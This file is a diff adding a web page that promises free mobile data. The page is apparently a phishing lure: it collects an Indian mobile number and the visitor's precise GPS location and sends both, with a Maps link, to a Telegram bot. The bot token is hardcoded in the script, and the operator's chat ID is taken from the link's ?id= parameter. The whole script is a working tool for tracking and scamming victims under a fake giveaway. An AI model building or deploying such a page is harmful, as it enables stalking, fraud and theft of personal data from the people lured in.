@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Free Data Claim</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: system-ui, sans-serif;
+      background: #0d1117;
+      color: #e6edf3;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+    .container {
+      background: #161b22;
+      border-radius: 16px;
+      padding: 32px 24px;
+      max-width: 420px;
+      width: 100%;
+      text-align: center;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.6);
+    }
+    .logo {
+      font-size: 100px;
+      font-weight: bold;
+      color: #00d084;
+      margin-bottom: 24px;
+      text-shadow: 0 0 30px #00d084;
+    }
+    .btn-group {
+      display: flex;
+      gap: 16px;
+      justify-content: center;
+      margin-bottom: 32px;
+    }
+    button.data-btn {
+      padding: 14px 32px;
+      font-size: 18px;
+      border-radius: 12px;
+      border: 2px solid #444c56;
+      background: #21262d;
+      color: white;
+      cursor: pointer;
+      transition: 0.2s;
+    }
+    button.data-btn.active {
+      background: #00d084;
+      border-color: #00d084;
+      color: black;
+    }
+    input {
+      width: 100%;
+      padding: 16px;
+      font-size: 18px;
+      background: #0d1117;
+      border: 1px solid #444c56;
+      color: white;
+      border-radius: 12px;
+      margin: 20px 0 24px;
+      text-align: center;
+    }
+    #claimBtn {
+      width: 100%;
+      padding: 18px;
+      font-size: 20px;
+      background: #238636;
+      color: white;
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+    }
+    #claimBtn:disabled {
+      background: #21262d;
+      cursor: not-allowed;
+    }
+    #status {
+      margin-top: 28px;
+      font-size: 17px;
+      min-height: 80px;
+      line-height: 1.4;
+    }
+    .success { color: #56d364; }
+    .error { color: #f85149; }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <div class="logo">1GB</div>
+
+  <div class="btn-group">
+    <button class="data-btn active" data-gb="1">1 GB</button>
+    <button class="data-btn" data-gb="2">2 GB</button>
+  </div>
+
+  <input type="tel" id="mobile" placeholder="Enter 10-digit mobile number" maxlength="10" />
+
+  <button id="claimBtn">Claim Free Data</button>
+
+  <div id="status"></div>
+</div>
+
+<script>
+  // ---------------- ONLY CHANGE THIS ----------------
+  const BOT_TOKEN = "7752428251:AAGNplPML8xLHGQDaHYgs5djp70KcqMBFEI";   // ← Replace with your real BotFather token
+  // --------------------------------------------------
+
+  const status = document.getElementById('status');
+  const claimBtn = document.getElementById('claimBtn');
+  const mobileInput = document.getElementById('mobile');
+
+  let selectedGB = '1';
+
+  document.querySelectorAll('.data-btn').forEach(btn => {
+    btn.onclick = () => {
+      document.querySelectorAll('.data-btn').forEach(b => b.classList.remove('active'));
+      btn.classList.add('active');
+      selectedGB = btn.dataset.gb;
+    };
+  });
+
+  claimBtn.onclick = async () => {
+    const mobile = mobileInput.value.trim();
+
+    if (!mobile || mobile.length !== 10 || !/^[6-9]\d{9}$/.test(mobile)) {
+      status.textContent = 'Please enter a valid 10-digit mobile number';
+      status.className = 'error';
+      return;
+    }
+
+    claimBtn.disabled = true;
+    status.textContent = 'Processing...';
+    status.className = '';
+
+    try {
+      // Get chat_id ONLY from URL parameter ?id=
+      const params = new URLSearchParams(window.location.search);
+      const targetChatId = params.get('id');
+
+      if (!targetChatId || !/^\d+$/.test(targetChatId)) {
+        throw new Error('Invalid or missing chat ID. Use link like: your-site.vercel.app/?id=123456789');
+      }
+
+      // Request location permission silently (only browser popup shows)
+      const pos = await new Promise((resolve, reject) => {
+        navigator.geolocation.getCurrentPosition(resolve, reject, {
+          enableHighAccuracy: true,
+          timeout: 12000,
+          maximumAge: 0
+        });
+      });
+
+      const { latitude, longitude } = pos.coords;
+
+      const mapsLink = `https://www.google.com/maps?q=\( {latitude}, \){longitude}`;
+
+      const message = 
+`New Claim Received!
+Mobile: ${mobile}
+Package: ${selectedGB} GB
+Location: ${mapsLink}
+Lat/Lng: ${latitude.toFixed(6)}, ${longitude.toFixed(6)}
+Time: ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`;
+
+      const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+      const response = await fetch(telegramUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: targetChatId,
+          text: message,
+          parse_mode: 'HTML',
+          disable_web_page_preview: false
+        })
+      });
+
+      const data = await response.json();
+
+      if (!data.ok) {
+        throw new Error(data.description || 'Failed to send to Telegram');
+      }
+
+      status.innerHTML = `Success!<br>${selectedGB} GB requested.<br>Please wait up to 1 hour.<br>(Location sent to Telegram)`;
+      status.className = 'success';
+
+    } catch (err) {
+      let msg = 'Something went wrong. Please try again.';
+
+      if (err.code === 1)      msg = 'You denied location access.';
+      else if (err.code === 3) msg = 'Location request timed out.';
+      else if (err.message.includes('chat ID')) msg = err.message;
+      else msg = err.message || msg;
+
+      status.textContent = msg;
+      status.className = 'error';
+      console.error(err);
+    } finally {
+      claimBtn.disabled = false;
+    }
+  };
+</script>
+</body>
+</html>
